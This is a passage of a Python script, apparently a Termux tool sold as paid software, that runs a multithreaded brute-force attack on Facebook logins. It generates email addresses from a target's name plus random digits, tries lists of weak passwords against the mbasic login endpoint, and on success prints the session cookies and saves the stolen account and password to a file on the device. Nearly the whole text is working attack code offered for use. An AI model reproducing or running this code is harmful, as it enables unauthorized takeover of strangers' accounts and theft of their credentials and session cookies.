    print(' CRACK PROCESS HAS BEEN COMPLETED ')    
def BER():
    user=[]
    os.system('clear')
    banner()
    print('\033[38;5;46m══════════════════════════════════')
    kode = input('\033[1;92m[\033[1;32m\033[1;92m]𝑻𝑬𝑹𝑮𝑬𝑻 𝑭𝑨𝑹𝑺𝑻 𝑵𝑨𝑴𝑬: ')
    print('\033[38;5;46m══════════════════════════════════')
    kodex = input('\033[1;92m[\033[1;32m\033[1;92m]\033[38;5;46m𝑻𝑬𝑹𝑮𝑬𝑻 𝑳𝑨𝑺𝑻 𝑵𝑨𝑴𝑬 :  ')
    print('\033[38;5;46m══════════════════════════════════')
    print('\033[1;92m[\033[1;32m\033[1;92m]\033[0;92mexample Doamin :\033[38;5;46m@gmail.com,\033[1;96m@yahoo.com ')
    print('\033[38;5;46m══════════════════════════════════')
    doamin = input('\033[1;92m[\033[1;32m\033[1;92m]\033[38;5;46m𝑰𝑵𝑷𝑼𝑻 𝑫𝑶𝑴𝑰𝑵𝑮 : ')
    print('\033[38;5;46m══════════════════════════════════')
    limit = int(input('\033[1;92m[\033[1;32m\033[1;92m]\033[38;5;46m𝑬𝑿𝑨𝑴𝑷𝑳𝑬: 3000, 5000, 15000, 20000\n\033[1;92m𝑪𝑯𝑶𝑶𝑺𝑬 𝑪𝑳𝑶𝑵𝑰𝑵𝑮 𝑳𝑰𝑴𝑰𝑻 : '))
    print('\033[38;5;46m══════════════════════════════════')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=50) as yaari:
        os.system('clear')
        banner()
        tl = str(len(user))
        print('\033[38;5;46m══════════════════════════════════')
        print('\033[1;92m[\033[1;32m\033[1;92m]\033[38;5;46m𝑭𝑨𝑪𝑬𝑩𝑶𝑶𝑲 𝑰𝑫:\033[38;5;46m '+tl)
        print('\033[38;5;46m══════════════════════════════════')
        print('\033[1;92m[\033[1;32m\033[1;92m]\033[38;5;46m𝑬𝑯𝑪 𝑪𝒀𝑩𝑬𝑹 𝟗𝟗 𝑬𝑴𝑹𝑨𝑵 ')
        print('\033[38;5;46m══════════════════════════════════')
        print('\033[1;92m[\033[1;32m\033[1;92m]\033[38;5;46m𝑾𝑶𝑹𝑲 𝑫𝑨𝑻𝑨 𝑾𝑰𝑭𝑰 ')
        print(f"\033[38;5;46m══════════════════════════════════")
        for guru in user:
            uid = kode+kodex+guru+doamin
            pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+'@@',kode+'##',kode+'hasan',kode+'1122',kode+'1988',kode+guru,kodex+'123',kodex+'1234',kodex+'12345','bangladesh','10203040']
            yaari.submit(rcerek,uid,pwx,tl)
    print(' [\033[1;92m\033[1;34m\033[1;92m] Crack process has been completed')
    print(' [\033[1;92m\033[1;34m\033[1;92m] Ids saved in ok.txt,cp.txt')    
def rcerek(uid,pwx,tl):
    global loop
    global cps
    global oks
    global agents 
    try:
        for ps in pwx:
        	pro = random.choice(ugen)
        	bi = random.choice([P,M,K,B,U,O,N,H])
        	session = requests.Session()
        	free_fb = session.get('https://mbasic.facebook.com').text
        	log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
        	header_freefb = {'HOST': 'm.prod.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    # 'cookie': 'sb=HALBZbzfi8e0cZ3H_jtcXwyh; ps_n=0; ps_l=0; datr=HALBZe9EOkWtQzIIOB59Fgaz; locale=en_US; wl_cbv=v2%3Bclient_version%3A2403%3Btimestamp%3A1707149197; vpd=v1%3B767x393x2.75; wd=393x767; fr=0CTEKM1nMpkeZx3AY.AWVMAgB5oaHWxqAc8DyrhPn-7ZQ.BlwQIc..AAA.0.0.BlyB63.AWX9HswyLbM',
    'dpr': '2.75',
    'referer': 'https://m.prod.facebook.com/login',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"23021RAAEG"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"14.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'pro',
}
        	lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
        	log_cookies=session.cookies.get_dict().keys()
        	if 'c_user' in log_cookies:
        	    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
        	    cid = coki[151:166]
        	    print ('')
        	    print('\033[1;92m[\033[1;92mPARVEJ-XD\033[1;92m] \033[1;92m'+uid+' | '+ps+ '\033[1;91m = \033[1;96m '+tahunng(cid))
        	    print ('\033[1;93m [\033[1;96mCookie \033[1;93m]\033[1;91m = \033[1;92m '+coki+'')
        	    cek_apk(session,coki)
        	    open('/sdcard/PARVEJ-RANDOM.OK.txt', 'a').write( uid+' | '+ps+'\n')
        	    oks.append(uid)
        	    break 
        	else:
        	    continue
        loop+=1
        brand=random.choice(['EMRAN CYBER','EMRAN-CYBER ','EMRAN CRACK '])
        colr=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
        colo=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
        emoji=random.choice(['😆','🐸','🙃','😈','🖕','🦅','🦉','🍎','🐝','🦟','🧐','😐','🙂','🤐','♥️','😘','😻','😍','😹','🤣','😂','😭','😁','😜','🤫','😶','🥱','😤','🥵','😇','💋','🙈','🙀','💚','💛','🖤','🤎','💙','💜','🦶','??','🌺','🌸','🏵️','🍁','🌼','??','🐍','🦡','✈️','🦛','🦐','🐇','🐮','🐰','🦃','🕸️','🦋','🍒','🍓','🍑','🍊','🥭','🍍','🍌','🌶️','🥥','🐛','🥕','🍗','🍆','🥐','🧀','🍤','🇧🇩','☠️'])
        colorful=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
        sys.stdout.write(f"\r \33[1;90m[{colr}🦋⃟ᎶꫝᴍᴇᏒ✮⃝ᎬᴍRꫝɴ𝄟⃝\33[1;90m]{colo}✘\33[1;90m[{colorful}{loop}\33[1;90m/\33[1;92m{tl}\33[1;90m]-[OK:{len(oks)}\33[1;90m]-\33[1;90m[{emoji}]  "),
        sys.stdout.flush()
        sys.stdout.write(f'\r\r%s {x}[{xr}\033[38;5;46m𝗘𝗠𝗥𝗔𝗡-??𝗬𝗕𝗘𝗥💥{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
        sys.stdout.write('\r%s[EMRAN-EHC]\033[1;32m-%s/%s][OK-%s]\033[1;92m[CP-%s] \r'%(bi,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()	
    except:
     pass
def EMRAN(uid,pwv,tl):
    global loop
    global cps
    global oks
    global agents 
    try:
        for ps in pwv:
            pro = random.choice(ugen4)
            bi = random.choice([P,M,K,B,U,O,N,H])
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'HOST': 'm.prod.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    # 'cookie': 'sb=HALBZbzfi8e0cZ3H_jtcXwyh; ps_n=0; ps_l=0; datr=HALBZe9EOkWtQzIIOB59Fgaz; locale=en_US; wl_cbv=v2%3Bclient_version%3A2403%3Btimestamp%3A1707149197; vpd=v1%3B767x393x2.75; wd=393x767; fr=0CTEKM1nMpkeZx3AY.AWVMAgB5oaHWxqAc8DyrhPn-7ZQ.BlwQIc..AAA.0.0.BlyB63.AWX9HswyLbM',
    'dpr': '2.75',
    'referer': 'https://m.prod.facebook.com/login',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"23021RAAEG"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"14.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'pro',
}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
        	    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
        	    cid = coki[151:166]
        	    print ('')
        	    print('\033[1;92m[\033[1;92mPARVEJ-XD\033[1;92m] \033[1;92m'+uid+' | '+ps+ '\033[1;91m = \033[1;96m '+tahunng(cid))
        	    print ('\033[1;93m [\033[1;96mCookie \033[1;93m]\033[1;91m = \033[1;92m '+coki+'')
        	    cek_apk(session,coki)
        	    open('/sdcard/PARVEJ-RANDOM.OK.txt', 'a').write( uid+' | '+ps+'\n')
        	    oks.append(uid)
        	    break 
            else:
        	    continue
        loop+=1
        brand=random.choice(['EMRAN CYBER','EMRAN-CYBER ','EMRAN CRACK '])
        colr=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
        colo=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
        emoji=random.choice(['😆','🐸','🙃','😈','🖕','🦅','🦉','🍎','🐝','🦟','🧐','😐','🙂','🤐','♥️','😘','😻','😍','😹','🤣','😂','😭','😁','😜','🤫','😶','🥱','😤','🥵','😇','💋','🙈','🙀','💚','💛','🖤','🤎','💙','💜','🦶','??','🌺','🌸','🏵️','🍁','🌼','??','🐍','🦡','✈️','🦛','🦐','🐇','🐮','🐰','🦃','🕸️','🦋','🍒','🍓','🍑','🍊','🥭','🍍','🍌','🌶️','🥥','🐛','🥕','🍗','🍆','🥐','🧀','🍤','🇧🇩','☠️'])
        colorful=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
        sys.stdout.write(f"\r \33[1;90m[{colr}🦋⃟ᎶꫝᴍᴇᏒ✮⃝ᎬᴍRꫝɴ𝄟⃝\33[1;90m]{colo}✘\33[1;90m[{colorful}{loop}\33[1;90m/\33[1;92m{tl}\33[1;90m]-[OK:{len(oks)}\33[1;90m]-\33[1;90m[{emoji}]  "),
        sys.stdout.flush()
        sys.stdout.write(f'\r\r%s {x}[{xr}\033[38;5;46m𝗘𝗠𝗥𝗔𝗡-𝗖𝗬𝗕𝗘𝗥💥{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
        sys.stdout.write('\r%s[EMRAN-EHC]\033[1;32m-%s/%s][OK-%s]\033[1;92m[CP-%s] \r'%(bi,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass

def mex():
    imt = '=EMRAN=EHC='
    os.system('clear')
    banner()   
    try:
        key1 = open('/sdcard/.a.txt', 'r').read()
    except IOError:
        os.system('clear')
        banner()
        print ('FUCK YOUR BYPASS SYSTEM')
        print ('\x1b[1;92mYou dont have subscrption')
        print ('This is paid command so need to aprove')
        print ('\033[1;92m If you want to buy presh enter')
        print ('')
        myid = uuid.uuid4().hex[:10]
        print ('         YOUR KEY :\033[1;93m ' + myid + imt)
        kok = open('/sdcard/.a.txt', 'w')
        kok.write(myid + imt)
        kok.close()
        print ('')
        input('   \x1b[0;34mENTER TO BUY TOOLS ')
        os.system('am start https://wa.me/+8801608002168?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20EMRAN%20Paid%20Tools.%20My%20Key:%20'+key1)
        mex()
    r = requests.get('https://wa.me/+8801608002168/EMRAN/approved.txt/main/approved.%20txt').text
    if key1 in r:
        print("\33[1;32mYour Token is Successfully Approved")
        time.sleep(0.5)
        menu()
    else:
        os.system('clear')
        banner()
        print ('FUCK YOUR BYPASS SYSTEM')
        print('')
        print ('You dont have subscrption')
        print ('THIS IS PAID COMMAND ')
        print ('')
        print ('YOUR KEY : \033[1;97m' + key1)
        print ('')
        print ('\x1b[0;34mIF YOU BUY TOOLS CONTACT ME')
        print ('')
        input('\033[1;92mIf you want to buy presh entero ')
        os.system('am start https://wa.me/+9710569549857?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20EMRAN%20Paid%20Tools.%20My%20Key:%20'+key1)
        mex()
if __name__=='__main__':
    try:os.system('git pull')
    except:pass
    try:os.mkdir('OK')
    except:pass
    try:os.mkdir('CP')
    except:pass
    try:os.mkdir('DUMP')
    except:pass
    try:os.system('touch .prox.txt')
    except:pass
    menu()
    